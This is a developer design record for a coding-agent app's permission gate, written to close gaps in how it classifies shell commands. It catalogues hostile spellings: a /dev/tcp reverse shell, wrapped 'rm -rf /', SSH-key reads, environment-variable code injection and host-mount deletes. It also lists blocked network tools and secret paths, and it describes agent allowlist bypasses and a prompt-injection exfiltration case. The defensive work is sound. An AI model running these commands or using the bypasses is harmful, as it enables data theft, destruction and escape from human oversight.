# Permission floor (roadmap step 10)

Date: 2026-09-13, implemented 2026-09-18. Provenance: roadmap
`.dump/app/roadmap/10-permission-floor.md`, `FULL-REVIEW.md` §6.3, and four
design questions put to the user and answered on 2026-09-18 (all four accepted
the recommendation).

## The problem being fixed

Every non-plan Claude run was sent to the SDK with its permission bypass
posture and the skip-permissions flag. That is not a floor: it is the absence of
one. The router then re-implemented a partial floor by hand, with a plan-mode tool
blocklist, an ask-mode approval list, and a dangerous-deletion regex, so the
effective policy lived in three places, only one provider had any of it, and the
dangerous-deletion table was unreachable from the other nine backends.

## Decision 1: the rule classes

Five, and no sixth. A tool call lands in exactly one.

| Class | What it covers | Shipped verdict |
| --- | --- | --- |
| `read-only` | Read, Glob, Grep, LS, NotebookRead, TodoWrite, BashOutput, AskUserQuestion, Skill, SlashCommand | allow |
| `approval` | Edit/Write/MultiEdit/NotebookEdit, and any Bash command no dangerous pattern matched, and any tool nobody classified | ask |
| `destructive` | the seven patterns below | deny |
| `network` | WebFetch, WebSearch, and egress commands | deny |
| `exfiltration` | a secret path reaching a reader or an egress channel | deny |

Destructive patterns, each with its own test and a near-miss test beside it:
`recursive-force-delete`, `destructive-sql`, `forced-git-push`,
`discarding-git-command`, `protected-path-overwrite`, `disk-or-power`,
`init-kill`. These are the patterns `detectDangerousDeletion` carried inside the
Claude router, moved to `src/shared/permissions/classifier.ts` so the rule
exists once.

Network is a verb list (`curl`, `wget`, `nc`, `ncat`, `netcat`, `telnet`,
`ssh`, `scp`, `sftp`, `ftp`, `lftp`), the remote git subcommands (`push`,
`fetch`, `clone`, `pull`, `remote`, `ls-remote`), the publish subcommands
(`npm|yarn|pnpm|cargo publish`, `twine upload`), and remote-target `rsync`.

**Residual Bash is `approval`, not `deny`.** This is the decision that keeps the
app usable: `npm test`, `git status` and package installs have to keep working
without a policy file. They are not read-only, so they ask in ask mode and allow
in the acting modes, exactly as the shipped floor sets it.

## Decision 2: precedence

Fixed order, highest first. Implemented in
`src/main/lib/permissions/evaluator.ts` and tested there.

0. **Unknown mode → deny `mode.unknown`.** A mode this app has no floor for
   fails rather than falling back to a wider posture. This is PA-8 in
   `provisional-assumptions.md`.
1. **Path safety → deny `path.<CODE>`.** The containment and symlink checks run
   before any policy, because a path that escapes the worktree is out of scope
   whatever its class. **Turbo is exempt from this step** unless the class is
   `exfiltration`, so turbo can read `/etc/hosts` but still cannot reach
   `~/.ssh/id_ed25519`. See decision 4.
2. **Plan-mode floor.** `ExitPlanMode` → deny `plan.exit-plan-mode`; read-only →
   fall through; approval + shell command → deny `plan.no-shell`; approval +
   markdown → allow `plan.markdown-edit`; approval + anything else → deny
   `plan.markdown-only`; every other class → deny `plan.read-only`.
3. **The critical-path breaker → ask `critical-path.<id>`.** Runs above the
   allow-list, so a user entry cannot pre-approve deleting the filesystem root.
   It downgrades `allow` to `ask` and never widens anything else. See decision 9.
4. **The mode's allow-list → allow `allow-list.<index>`.** Checked after the
   plan floor, never for `exfiltration`, and never when step 3 found a breach, so
   no entry a user writes can carry a secret out or reformat a disk.
5. **The policy verdict → `<class>.mode.<mode>` or `<class>.policy`.** A
   per-mode verdict beats the class verdict, because the mode is what the user
   picked for this run.
6. **A throw anywhere → deny `evaluator.error`.** The gate never throws at its
   caller, because a caller left to invent a fallback is how the bypass got
   there in the first place.

Note what step 2 costs: in plan mode a destructive or exfiltrating action is
denied with rule `plan.read-only`, not with its own class rule. The floor sits
above the class verdict on purpose, because plan mode narrows only, and the reason
text still names the class, so the user is not left guessing.

## Decision 3: the SDK posture is `default`, not `acceptEdits`

The roadmap's §6.4 table says `agent → acceptEdits`. **That is overridden.**
Anthropic documents that a tool call auto-approved by a permission mode never
reaches `canUseTool`, and that `acceptEdits` auto-approves Edit and Write plus
the shell commands `mkdir`, `touch`, `rm`, `rmdir`, `mv`, `cp` and `sed`
(<https://docs.claude.com/en/docs/claude-code/sdk/sdk-permissions>, read
2026-09-18; confirmed against the pinned SDK types for 0.2.45). Under
`acceptEdits` those calls would never reach the gate, so the floor would not
cover the file writes it exists to cover.

`default` is the posture Anthropic describes as requiring a `canUseTool`
callback to handle approval, and it still auto-allows reads inside the working
directory, which the `read-only` class allows anyway. So ask, edit, agent and
turbo all run under `default` and the policy decides; plan keeps `plan`.

The user was asked and accepted this override.

## Decision 4: turbo is the opt-out tier (revised 2026-09-18)

Superseded. The first cut of this step gave turbo an empty allow-list and denied
destructive commands and network egress, on the argument that a headless provider
cannot prompt so anything unlisted should fail closed. The owner rejected that on
2026-09-18. Turbo is the mode a user selects precisely because they do not want
to be asked, and shipping it with the same refusals as edit mode left the tier
with no reason to exist.

The shipped floor is now `read-only`, `approval`, `destructive` and `network` all
`allow`, with `exfiltration` at `deny`. Two things survive the opt-out.

1. **Exfiltration still denies.** Reading a secret path and posting a secret
   somewhere are the actions that cannot be undone by re-running anything, and
   they are the ones a prompt would not have caught anyway because nobody reads
   them in turbo.
2. **The critical-path breaker still asks.** See decision 9.

Turbo also stops refusing paths outside the worktree, so `Read("/etc/hosts")`
resolves on its class instead of tripping containment. Containment is unchanged
in plan, ask, edit and agent. `evaluator.test.ts` asserts the exemption and the
four modes that keep it, one case each.

**This is the one place the step's acceptance criteria are not met as written.**
Criterion 3 asks that an unset policy file yields deny-by-default rather than the
old bypass. It holds for four modes and for the two classes above. It no longer
holds for destructive commands or network egress in turbo, where an unset policy
file now allows them. That is a deliberate product decision by the owner, not a
wiring gap, and it is recorded in the benchmark next to the numbers that show it.

The tooltip copy in `src/renderer/features/agents/lib/mode-display.ts` says what
turbo actually does now. It names destructive commands and network egress as
things that run, and it names the two things that still ask, which are a removal
on a critical path and a device reformat or a power verb. An earlier draft of that
string said turbo takes no prompts at all, which the critical-path breaker above
makes false.

## Decision 5: the tool-rule grammar has four spellings (revised 2026-09-18)

Superseded. The first cut refused `Tool(prefix:*)`, treating its colon as
ambiguous about whether the separator belongs to the prefix. The owner asked for
it to be supported, and the research backs that up. `:*` is Claude Code's own
spelling for a prefix rule, so refusing it means a user who copies a working
`settings.json` rule into `permissions.toml` gets a schema error for a rule that
does exactly what they expect.

`parseToolRule` now accepts all four.

| Spelling | Match | Example |
| --- | --- | --- |
| `Tool` | any call to the tool | `WebFetch` |
| `Tool(prefix *)` | startsWith, separator included | `Bash(git *)` matches `git status`, not `gitpush` |
| `Tool(prefix:*)` | startsWith, separator not implied | `Bash(npm run test:*)` matches `npm run test --watch` and `npm run test:unit`, not `npm run tests` |
| `Tool(exact)` | equality | `Bash(git status)` |

The `:*` form keeps a `separator` field on the parsed rule, and
`toolRuleMatches` requires the next character after the prefix to be that
separator or the end of the string. So `Bash(npm run test:*)` will not match
`npm run testable`. `Bash(:*)` is still refused, because an empty prefix would
match every call and there is already an unambiguous spelling for that, `Bash(*)`.

The schema error message now lists all four accepted spellings so a rejected
entry says what to write instead.

## Decision 6: fail closed on the policy file

- Absent file → the shipped floor, `source: "default"`. Never created by a read.
- Unparseable or schema-invalid file → the shipped floor,
  `source: "invalid-file"`, with the failure named on the denial, including the
  line number when the parser has one.
- A loader that throws for a reason the reader did not anticipate →
  `UNREADABLE_POLICY`, which denies every class including `read-only`. An
  unexpected failure in the thing that decides what is allowed must not leave
  the permissive defaults in charge.

The schema is `.strict()` at every level, so a typo narrows rather than being
silently ignored. `[modes.plan]` is a schema error: the evaluator owns the plan
floor, and a file that claims it would be believed by the user and dropped by
the code.

`~/.claude/settings.json` is never written by this path. mausCode policy lives
in `~/.mauscode/permissions.toml`. The pre-existing code that symlinks the
user's Claude settings into an isolated config dir still only reads it, and
`policy-file.test.ts` proves the bytes are unchanged after every read path.

## Decision 7: TOML, hand-rolled, read-only

No TOML parser is installed and `AGENTS.md` forbids adding a dependency outside
the dependency step, so `src/shared/permissions/toml.ts` parses exactly the
subset the policy file uses and rejects everything else. Rejecting is the safe
direction. The vocabulary is class verdicts plus an allow-list, not raw Claude
rule strings, so the file reads the same for every backend.

The serializer was written and then deleted: nothing writes the file yet, and an
unused export is a writer nobody tested. The settings surface that adds it will
have to stay inside this subset.

## Decision 8: agent mode splits network in two (added 2026-09-18)

Agent mode used to deny network outright. The owner asked for web access to work
in agent mode without a card, while outbound shell commands still reach a human.
Those are two different actions, so the floor now treats them differently.

`WebFetch` and `WebSearch` are on the agent mode's shipped `allow_tools`, which
means they pass at precedence step 4 and the rule id says `allow-list.0` or
`allow-list.1`. A shell command that reaches the network, such as `curl` or
`wget`, classifies as `network` and asks under `network.mode.agent`. The user
policy cannot re-deny the allow-listed tools, which is the documented property of
that step: the allow-list widens within the mode and a class verdict cannot take
that back.

An allow-list entry never matches an `exfiltration` call, so `curl -T .env` in
agent mode still denies even though `WebFetch` is allowed.

## Decision 9: the critical-path breaker asks (added 2026-09-18)

The owner chose `ask` over `deny` when asked which way a circuit breaker should
fall. The breaker is the one thing that can still stop a turbo run, so it had to
be either, and `ask` keeps a human in the loop without making the mode refuse to
clean its own build directory.

`criticalPathBreach(command, worktreeRoot?)` in
`src/shared/permissions/classifier.ts` reports a breach when a destructive verb
targets something that should not be deleted unattended.

- The filesystem root, the home directory, the current working directory, the
  parent directory, and the worktree root itself.
- Disk and power verbs, which destroy data whether or not they name a path.

The evaluator runs it at precedence step 3, above the user's allow-list and above
the class verdict. A breach nulls the allow-list hit and downgrades `allow` to
`ask` with a rule id of `critical-path.critical-delete` or
`critical-path.disk-or-power`. It only ever narrows. A breach cannot turn a deny
into an ask, because an ask is wider than a deny.

Two invariants are tested rather than assumed. `sudo` is stripped before the scan,
so `sudo rm -rf /` breaches too. The reason names the target in plain English and
never echoes the command text, because the reason is rendered in the transcript.

This mirrors upstream behaviour. Claude Code keeps a circuit breaker in its own
most permissive mode, where deleting the filesystem root or the home directory
still prompts even though every allow rule is ignored.

## Decision 10: what the engine-only providers get (added 2026-09-18)

The capability manifest already records `permissionFloor` as `engine-only` for the
nine providers without an app gate. Turbo now needs an explicit rule list there
too, because a broad app-side allow does not travel through a provider that only
understands its own flags.

Grok is the case that matters, since it has a rule grammar. `GROK_TURBO_ALLOW` in
`src/main/lib/grok-print/args.ts` is `Bash(*)`, `WebFetch` and `WebSearch`, and
`allowRulesFor()` unions it with the policy file's `allow_tools` for turbo only.
Edit and agent pass the policy's list through unchanged. **No mode emits the
provider's always-approve token**, and `no-bypass.test.ts` plus
`grok-print/args.test.ts` assert that. Deny rules still hold under Grok's
always-approve, but mausCode does not rely on that, because it never asks for it.

The gap is recorded rather than papered over. **Engine-only providers cannot
enforce the exfiltration class or the critical-path breaker.** Grok in turbo can
carry a secret out, and the app cannot stop it, because no app-side code sees the
call. The manifest says `engine-only` for exactly this reason, and the settings
tab shows that label next to the provider so a user can see which floor they are
getting. Closing it needs a provider-side hook or a proxy, which is a follow-up
and not part of this step.

## Decision 11: the classifier reads the real verb, not the first word (added 2026-09-18)

Found in a six-pass review of this diff, then reproduced by running the shipped
classifier. `splitCommandSegments` took each segment's first word as its verb and
skipped only `sudo` and `VAR=` assignments. Every command that put something
between the shell and the verb therefore landed in the residual `approval` class,
which Agent mode allows and turbo runs without a prompt.

| Command | Before | After |
| --- | --- | --- |
| `bash -c "rm -rf /"` | approval, allowed in agent | destructive, denied in agent, asks in turbo |
| `sh -c 'rm -rf /'` | approval | destructive |
| `eval "rm -rf ~"` | approval | destructive |
| `sudo -u root rm -rf /` | approval, verb read as `-u` | destructive |
| `timeout 30 rm -rf /` | approval | destructive |
| `nice -n 5 rm -rf /` | approval | destructive |
| `xargs rm -rf /` | approval | destructive |
| `git -C /repo push --force` | approval | destructive, `forced-git-push` |
| `dd if=/dev/zero of="/dev/sda"` | approval | destructive, `disk-or-power` |

Three changes close it.

1. Quotes are stripped from every word, so `of="/dev/sda"` reads as `of=/dev/sda`
   and a quoted payload stops hiding its contents.
2. `readVerb` skips a fixed wrapper list before naming the verb. The list is
   `sudo`, `doas`, `env`, `command`, `exec`, `nohup`, `nice`, `ionice`, `time`,
   `timeout`, `stdbuf`, `xargs`, `setsid`, `chroot` and the shell verbs `sh`,
   `bash`, `zsh`, `dash`, `ksh` and `eval`. Claude Code strips the same idea
   before matching a Bash rule, which its documentation lists as timeout, time,
   nice, nohup, stdbuf and bare xargs, "so they cannot be used to smuggle a
   command past a rule". Options that take a separate value are skipped with
   their value, which is what `sudo -u root` and `nice -n 5` needed, and a bare
   duration is skipped so `timeout 30` works. `-c` is deliberately not treated as
   value-taking, because for a shell verb it introduces the payload this file has
   to read.
3. `readSubcommand` skips git's own global options, so `git -C /repo push` reads
   `push`. This is the bypass filed upstream against Claude Code as "options
   inserted between command and subcommand".

Forced push is now read from the segment rather than by a regex that needed `git`
and `push` to be adjacent. It catches the long flags, a short-flag cluster
containing `f` such as `-fu`, and the `+refspec` spelling, which forces an update
without naming a flag at all.

Three more destructive patterns were added while the gap was open: `find` with
`-delete`, `shred`, and the partition and filesystem tools `wipefs`, `fdisk`,
`cfdisk`, `sfdisk`, `parted`, `sgdisk` and `gdisk`. `systemctl poweroff` and
`service host reboot` now read their subcommand for the power verbs too. The
breaker covers `find <critical> -delete` as well as `rm` and `rmdir`.

**What was checked for false positives.** Quote stripping makes the word `rm`
appear inside `grep -rn "rm -rf" .`, and that command must stay ordinary. It
does, because the destructive and breaker checks still key on the resolved verb
rather than on the presence of a word, and `grep` resolves as the verb. The same
holds for `echo "do not run rm -rf /"`, `git rm --cached secret.txt`,
`find . -name '*.ts' -print`, `dd if=in.bin of=out.bin` and `git push origin main`.
Each is a test in `classifier.test.ts`, in a block named for what it guards
against rather than for what it does.

`SlashCommand` left `READ_ONLY_TOOLS` in the same pass. A custom slash command can
carry a `!` shell execution that does not come back through the Bash tool, so
reading it as read-only let plan mode run a command, and a repository ships its
own `.claude/commands/`. It takes the residual `approval` class, which plan mode
refuses. `Skill` stayed read-only, because a skill's actions arrive as their own
gated tool calls.

## Decision 12: the floor is enforced twice on Claude, as a hook and as canUseTool (added 2026-09-18)

Also found in review. The router passes `settingSources: ["project", "user"]`, so
the engine reads `.claude/settings.json` from the workspace and from the user's
home directory. Anthropic documents that a call an allow rule auto-approves never
reaches `canUseTool`, and `canUseTool` is where this gate lives. A repository
ships its own settings file, so a cloned workspace containing
`{"permissions":{"allow":["Bash"]}}` would have taken every shell command out
from under the floor, and nothing in the transcript would have said so. That
falsified the claim this step makes, which is that every agent action passes one
gate.

Emptying `settingSources` is the isolation mode the SDK describes, and it is not
available here, because the same option is what loads CLAUDE.md and the project's
skills. So the floor is enforced at the hook instead.

`src/main/lib/claude/permission-hook.ts` builds a `PreToolUse` matcher that runs
the same `evaluateAction` and forwards only a deny or an ask. **It never returns
allow**, so it cannot widen a posture the engine already applied, and anything it
does not object to still reaches `canUseTool` exactly as before. A throw inside it
denies. There is no `matcher` field, so it runs for every tool, because a per-tool
matcher would leave the tools nobody listed ungated.

The cost is a second evaluation per call. Measured, classification is 4.2 us mean
and the cached policy read is 2.2 us, so the duplicate is tens of microseconds
against a model round-trip. The gate is not on the critical path either way.

## Decision 13: exfiltration is not a verdict a policy file may lift (added 2026-09-18)

`resolvePolicy` refuses to merge `[modes.plan]`, and the reason recorded beside it
is that a floor a file could lift would not be a floor. The same argument applies
to the exfiltration class and had not been applied to it. A file could write
`[classes] exfiltration = "allow"`, or set it for one mode, and the gate would
then allow reading `~/.ssh/id_ed25519`. The evaluator's rule that no allow-list
entry may cover exfiltration would have been the only thing left, and it does not
constrain a class verdict.

`exfiltration = "allow"` is now a schema error in both the `[classes]` table and a
per-mode table, so the whole document fails closed and the message says to use
`ask` or `deny`. Both stay writable. Being prompted before a secret is read is a
legitimate choice and is narrower than what turbo permits for every other class,
so refusing it would be paternalism rather than a floor.

## Decision 14: an allow-list entry may not look like a flag (added 2026-09-18)

`parseToolRule` accepted any non-empty string as a tool name, so
`allow_tools = ["--always-approve"]` parsed. On the Grok path each entry is pushed
onto argv as the value of `--allow`, and the resulting command line ended
`--allow --always-approve`. A parser that reads the next token as a flag rather
than as that value would have been handed the bypass token this step exists to
keep off the command line, arriving through a side door that
`no-bypass.test.ts` cannot see, because the test reads source files and not argv.

`isToolName` now refuses a leading dash, which fails the document closed and tells
the user what to write instead. The policy file is user-owned, so the realistic
threat is a mistake rather than an attack, but the argv was wrong either way.
Grok is spawned with an argument array and no `shell: true`, so nothing in a rule
string can reach a shell.

## Decision 15: a secret a shell command names is exfiltration, egress or not (added 2026-09-19)

Found by a probe run against the built classifier, not by reading it. `cat ~/.ssh/id_ed25519` classified as `approval` with no breaker, so Agent mode allowed it and turbo ran it with no prompt at all.

That contradicted the reasoning already written above `SECRET_PATH_PATTERNS` in the same file, which says a secret path's contents leave the machine the moment a model reads them because the model's context is uploaded to the provider by design, and that no later gate can catch it. The file-tool path honoured that: `Read` with `file_path` pointing at a key denies in all five modes. The shell path required a network verb in the same segment, so the identical leak through `cat` walked past.

A network verb is no longer required. `secret-egress` still names the case where one is present, and `secret-command` names the case where one is not.

The published guidance agrees on where to break the chain. A vendor write-up of this exact attack puts it plainly: the most effective break point is the sensitive read, because if the agent cannot read `~/.ssh/id_rsa` there is nothing to exfiltrate. A hardening guide's own PreToolUse hook blocks on the path appearing in the tool input at all, with no egress condition, over a list containing `.env`, `id_rsa`, `id_ed25519`, `.ssh/`, `.aws/` and `.netrc`. CVE-2025-55284 is the reason the egress condition was never sufficient anyway: a hidden prompt in a file Claude Code analysed left with `.env` contents in DNS queries, past the network controls.

Two consequences are accepted rather than hidden. A write to a secret path is not a read, so a segment carrying a redirect into one stays with `protected-path-overwrite` and keeps its accurate reason; `echo key > ~/.ssh/authorized_keys` is a backdoored key file, not a leak. And a command that merely mentions a secret without printing it, `chmod 600 ~/.ssh/id_ed25519`, now denies. That is a false positive in the safe direction, it is rare in agent work, and telling `chmod` from `cat` reliably is not something a text classifier can do.

An earlier shape of this fix asked whether the segment contained `>` anywhere and treated the secret as written if so. That was wrong and the probe caught it: `cat ~/.ssh/id_ed25519 2>/dev/null` has a redirect and still prints the key to standard output, so the guard let the read through. The check now asks whether this word sits on the receiving end of the redirect, which is the question that matters.

## Decision 16: an environment assignment that carries code is destructive (added 2026-09-19)

Found in research rather than by probing, which is why the research pass runs. CVE-2026-55743 is a shipped desktop agent whose shell allowlist stripped leading `KEY=value` assignments before validating the command, so `GIT_PAGER=/tmp/payload.sh git log` ran the payload through an allowlisted `git`. This classifier had the same shape: `readVerb` skips any word containing `=`, by design, so the assignment was invisible to every pattern in the file and the verb read as `git`.

The variable has to be one that carries code and the value has to look executable, because the same CVE rule publishes its benign examples and they are common: `TZ=UTC git log` and `NODE_ENV=production npm test`. Both stay allowed, as do `GIT_PAGER=cat` and `EDITOR=vim`, whose values are builtins rather than paths. The carrier list covers the loader and runtime hooks (`LD_PRELOAD`, `LD_AUDIT`, `PYTHONSTARTUP`, `NODE_OPTIONS`, `PERL5OPT`, `RUBYOPT`, `JAVA_TOOL_OPTIONS`), the git program slots (`core.pager`, `core.editor`, `core.sshCommand`, `core.hooksPath`, `core.fsmonitor`, `GIT_ASKPASS`, `GIT_TEMPLATE_DIR`), the shell's own (`BASH_ENV`, `PROMPT_COMMAND`, `ENV`, `SHELL`), and the pager hooks `LESSOPEN` and `LESSCLOSE`.

Two spellings needed more than the list. `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.pager GIT_CONFIG_VALUE_0=/tmp/x.sh git log` carries an index in the name, so those are matched rather than listed. And `LESSOPEN='|/tmp/x.sh %s' less file` has a pipe inside the value, which the segment splitter cuts in half, so the check also scans the raw command. A leading `=` test guards both scans, because this runs on every shell command the gate sees.

## Decision 17: `find -exec rm` deletes, and its escaped parentheses are arguments (added 2026-09-19)

`find / -exec rm -rf {} +` classified as `approval`. It removes a whole tree and names no `rm` in the leading position, so the verb check never saw it. This is a reported bypass against a shipped agent in the wild, filed by a user who had `find` on an allow list and `rm` on a deny list and watched the command run anyway. CVE-2026-55743 is the same oversight one layer down: its guard blocked `-exec` and `-ok` but not the functionally identical `-execdir` and `-okdir`. All four are covered here, plus an exec'd path, because `find . -execdir /tmp/run.sh {} ;` runs attacker-chosen code once per matched file and names no delete verb at all. An exec'd verb that only reads stays ordinary, so `find . -execdir grep -l TODO {} +` is not caught.

The breaker reads these as deletes too, so `find / -exec rm -rf {} +` breaches the critical path.

A second probe found the grouping spelling. `find . \( -name '*.log' \) -delete` split on the escaped parentheses, which the splitter treated as a subshell, and `-delete` landed in a segment of its own with no verb attached. Escaped parentheses are now replaced before splitting, so they stay arguments. `find . \( -name x \) -delete` breaches as `critical-delete`, because `.` is a critical target on the strength of the incident already on record in this repository.

## Decision 18: bash's pseudo-device socket is a network channel (added 2026-09-19)

`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` classified as `approval`. It is a reverse shell: bash opens the connection itself, so there is no network verb on the line for a verb table to find. `exec 196<>/dev/tcp/192.168.1.2/443` is the same thing with a file descriptor. Both are network now.

This is not an exotic spelling. It has a Sigma rule of its own at critical level, a Wazuh custom rule, and it appears in every reverse-shell cheat sheet, usually wrapped in `bash -c`. Matching `/dev/tcp/` and `/dev/udp/` anywhere in a word catches the wrapped form, because quotes come off first and the device path stays literal. A percent-encoded spelling, `%2Fdev%2Ftcp%2F`, carries no literal path, and the classifier does not decode it, so that spelling sits in the residual below.

`/dev/tcp` is excluded from the protected-path redirect rule at the same time. `exec 196<>/dev/tcp/host/port` matched the redirect rule's `/dev/` alternative and reported as a write into a protected system directory, which denies the right command for the wrong reason and tells the user a file was overwritten when a socket was opened. The exclusion no longer needs spelling out as a special case, because a later revision replaced that pattern with a check for a protected location or a block device, and a pseudo-device socket is neither.

## Decision 19: a container that mounts the host defeats containment, so the mount is what gets caught (added 2026-09-19)

`docker run -v /:/host alpine rm -rf /host` deletes the host filesystem through a path the gate never sees. Nothing in `containment.ts` can help, because the delete happens in another mount namespace, and the command's own verb is `docker`.

It also landed in the wrong class, and the first draft of this paragraph claimed more for the fix than the fix does. `docker run` was a network rule for the pull it usually implies. Moving the mount to destructive changes one mode's verdict and improves the reason in the others. Measured against the shipped floor with no policy file, `docker run -v /:/host alpine rm -rf /host` now answers deny `plan.read-only` in plan, ask `destructive.mode.ask` in ask, deny `destructive.policy` in edit and in agent, and allow `destructive.mode.turbo` in turbo.

Agent is the mode that gained: it asked under the network class and it denies under destructive. Ask went the other way and that is worth stating plainly, because it asked for nothing before and it now puts the mount in front of a human, which is what ask mode promises for every destructive action. Plan and edit deny either way and only the reason improved. Turbo allows it before and after, because turbo allows both classes, and the escape this decision describes is still available there. That is the opt-out tier working as ratified rather than a hole this rule closed, and a reader who takes this paragraph as evidence that turbo refuses a host mount is reading it wrong.

`run`, `create` and `exec` are no longer network for docker and podman, which also removes a card on every local container run, and a mount whose host side is `/`, `~`, `/etc`, `/home`, `/root`, `/var`, `/usr`, `/bin` or `/dev` is destructive instead. All three spellings count: `-v /:/host`, `--volume=/home:/h`, and `--mount=type=bind,source=/,target=/host`. A worktree-relative mount stays ordinary, because that is what a container is for here, and so does a named volume.

The review bot found a fourth spelling this rule missed on the push that introduced it. `docker run -v/:/host` glues the specification onto the flag cluster with no space and no equals sign, and splitting on the colon first read the host side as `-v/`, which matches nothing. The cluster comes off before the split now, so `-v/:/host`, `-v~:/h`, `-v/etc:/h` and `-itv/home:/h` all count.

## Decision 20: the wrappers, the backslash and the field separator (added 2026-09-19)

Decision 11 taught the classifier to skip wrappers and named the ones Claude Code strips. A probe of 45 spellings found the list was still short, and every gap classified as `approval`.

`su`, `runuser`, `pkexec`, `systemd-run`, `unshare`, `nsenter`, `script`, `watch`, `parallel` and `builtin` are wrappers now. `su` and `runuser` also take a subject before the command, so `su root -c 'rm -rf /'` needs the username skipped or the verb reads as `root`, which is neither a delete nor a wrapper.

A leading backslash is stripped by turning it into a forward slash, so `\rm -rf /` resolves to the verb `rm`. This is the classic spelling that steps around a shell alias and it is published as a filter bypass in its own right, spelled there as `\u\n\a\m\e \-\a`. The same substitution improves Windows paths: `C:\Users\me\.ssh\id_rsa` gains the separators the secret patterns match on, so it reaches the `.ssh/` rule instead of sliding past it.

`$IFS` becomes a space before splitting, because it is the shell's own field separator and `rm$IFS-rf$IFS/` is `rm -rf /` written without a literal space for a matcher to split on. The braced form is handled too, and published bypass write-ups use exactly this substitution to build a payload.

Decision 11's forced-push fix is now applied to the rest of git. `hasDiscardingGitCommand` was still a regex needing `git` and the subcommand to be adjacent, so `git -C /repo reset --hard` and `git --no-pager clean -fdx` both walked past. It reads the segment now. `git branch -D` needed the raw command, because lowercasing is what makes `-D`, which discards an unmerged branch, indistinguishable from `-d`, which refuses to. `git branch -f` moves a branch rather than deleting one, so it stays ordinary. `stash clear`, `reflog expire`, `filter-branch`, `filter-repo`, `update-ref -d` and `tag -d` joined the discarding set.

## Decision 21: the device rules read the subcommand, and `/dev/null` is not a disk (added 2026-09-19)

`dd` was the only write verb the disk rule knew, and it matched any `of=/dev/` prefix, which called `dd if=/dev/zero of=/dev/null` a reformat. That was a false positive in the safe direction, but it asked for a card on a benchmark idiom and it is the kind of over-block that teaches a user to approve without reading.

A block-device pattern names the device families instead, so `/dev/null`, `/dev/zero`, `/dev/shm` and the pseudo-device sockets are out.

Which verbs count, and against which argument, is the part that took two rounds. The review bot found that `cat` and `cp` had been added to the write set wholesale, so `cat /dev/sda` and `cp /dev/sda /tmp/backup` both reported as a reformat when neither writes to the device. `cat` is out entirely, because it reads its arguments and a write through it needs a redirect that the protected-path rule already reads. `cp`, `mv` and `install` count only against their last argument, which is where the bytes go, so `cp backup.img /dev/sda` is caught and `cp /dev/sda /tmp/backup` is not. `tee`, `truncate` and `shred` take every argument, and `dd` reads `of=`. Verifying the bot's two findings turned up a third it had not mentioned: `mv image.iso /dev/sdb` writes a device and was allowed.

The tools that destroy a device only for some subcommands read the subcommand or the flag: `nvme format` and `nvme sanitize`, `dmsetup remove`, `wipe_table` and `suspend`, `hdparm --security-erase`, `mdadm --zero-superblock`, `badblocks -w`, `smartctl --sanitize`. Their query forms stay ordinary, because `nvme list`, `mdadm --detail`, `hdparm -I` and `dmsetup ls` are reads and a rule that asked for a card on every query would be turned off.

Writes into a protected directory are caught without a redirect operator as well. `tee ~/.ssh/authorized_keys` installs a key and would otherwise have landed in `approval`. `cp` and `mv` only count when the protected path is the destination, so `cp /etc/passwd /tmp/copy` reads a protected file and stays ordinary.

## Decision 22: a write verb's destination is where its flags put it (added 2026-09-19)

GNU's `cp`, `install`, `ln` and `mv` take `--target-directory` (`-t`), and the
coreutils manual is explicit about what it does: the directory becomes "the
directory component of each destination file name", so every other operand is a
source and each one lands under that directory with its own basename. The
classifier read the destination as the last word, which made
`cp -t /home/u/.ssh /tmp/authorized_keys` an ordinary command in the approval
class, and Agent mode allows that class, so a login key could be copied into
place. All four spellings are now read, `-t DIR`, `-tDIR`,
`--target-directory DIR` and `--target-directory=DIR`, and each source is also
checked as `DIR/basename`, so `cp -t /etc /tmp/passwd` is the write to
`/etc/passwd` that it is.

Three details decided on the way:

- **`-T` is the opposite flag and differs only by case.** `--no-target-directory`
  says the last operand is a plain file, and GNU refuses it beside `-t`. Every
  word in a segment is lowercased, which erases the difference, so a segment now
  carries `noTargetDirectory` and the flag parser returns nothing when it is set.
  Without that, `mv -T /etc/passwd /tmp/x` named the source as the destination
  and denied a move that writes an ordinary file.
- **`ln` joins the write verbs.** The link it names last is a file it writes, and
  a link puts attacker-chosen content in a protected directory with no copy verb
  on the line. `ln -s /tmp/payload /home/u/.ssh/authorized_keys` was approval
  class before this and is a protected-path overwrite now.
- **The direction of a protected operand follows the destination.** With `-t`,
  the remaining operands are reads, so `cp -t /tmp/x /home/u/.ssh/id_rsa` is the
  exfiltration that `cp /home/u/.ssh/id_rsa /tmp/x` is, and
  `mv -t /tmp/backup /etc/passwd` is the approval that `mv /etc/passwd /tmp/backup`
  is. Two spellings of one action get one verdict, and a test asserts exactly
  that pairing rather than asserting each verdict on its own.

CodeRabbit found this on the pushed head. It is the same shape as the reported
bypasses against a shipped agent in claude-code#13371, where the defeats were
command options rather than command verbs, `git -C /path commit` and
`rm --force --recursive /home` among them.

## Decision 23: a container that starts opens a channel (added 2026-09-19)

`docker run`, `create`, `start` and `exec`, and the same four for `podman`, are
network subcommands now. A container that starts gets the default bridge network,
and an image the host does not have is pulled before it starts, so the channel
opens whether or not the command inside the container names a network verb.
`exec` is there because it runs code in a container that already has one.

`build` started out of the set on the ground that a build on a base image the
host already holds opens nothing, and a test pinned `docker build -t app .` as
not network. CodeRabbit found the ground wrong: a `RUN` step runs on the default
build network whether or not the base is cached, so a cached base changes nothing
about the channel. `build` is now a network subcommand for `docker` and `podman`,
and the test pins it on the network side instead. `ps`, `logs` and `images` stay
local for the reason the subcommand table exists at all.

The consequence in Agent mode is a card on a container start, because network is
the class the owner set to ask there. CodeAnt asked for `docker run` alone;
`create` and `start` are the same action in two steps and `exec` is the same
capability in a running container, so leaving them out would have been a rule
that a model could walk around by spelling it differently.

## Decision 24: the mode picker says when Maus has no gate (added 2026-09-19)

The five mode tooltips describe what the app gate does, and only the Claude path
has one. On the other nine backends a picker that reads "Destructive, network and
exfiltrating actions are blocked" promises something this app cannot deliver,
which is what CodeAnt found on the plan tooltip and OpenClaw, where plan mode is
a read-only request in the prompt with no flag behind it.

`getModeTooltip` takes the floor as a second parameter with no default, so a call
site has to say which backend it is describing, and both pickers pass
`permissionFloorFor(provider)`. An engine-only backend's tooltip keeps the mode
description and adds one sentence: Maus has no gate on this backend, so it cannot
block what the backend allows.

The sentence claims nothing about what the backend refuses, because the nine
differ and one answer cannot cover them. Cline maps plan and ask to `-p`, Roo
maps the modes to its own slugs, Grok takes an allow list, and OpenClaw has no
mode flag at all. Each manifest already says which of those it is, in the note
line Settings renders.

